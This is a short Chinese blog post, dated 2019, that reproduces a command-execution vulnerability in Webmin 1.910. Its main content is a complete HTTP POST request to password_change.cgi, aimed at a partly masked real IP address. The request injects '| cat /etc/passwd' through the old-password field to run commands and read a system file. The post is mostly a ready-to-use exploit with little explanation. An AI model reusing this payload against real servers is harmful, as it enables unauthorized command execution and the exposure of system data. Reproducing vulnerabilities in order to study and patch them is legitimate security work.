---
layout: post
title: "webmin_CMS命令执行漏洞复现"
subtitle: "webmin_CMS命令执行漏洞复现"
date: 2019-08-19
author: ppbibo
category: security
finished: true
---
[TOC]

## 正文

看到群里表哥曝出 webmin CMS 命令执行漏洞，所以复现下。

**version： Webmin 1.910**

```http
POST /password_change.cgi HTTP/1.1

Host: 107.**.**.**:30000

Referer: https://107.**.**.**:30000/sesss.cgi

Content-Type: application/x-www-form-urlencoded

Content-Length: 73

user=demo&pam=&expired=2&old=test | cat /etc/passwd&new1=test2&new2=test2
```



**RT：**

![webmin](/static/img/webmin.png)



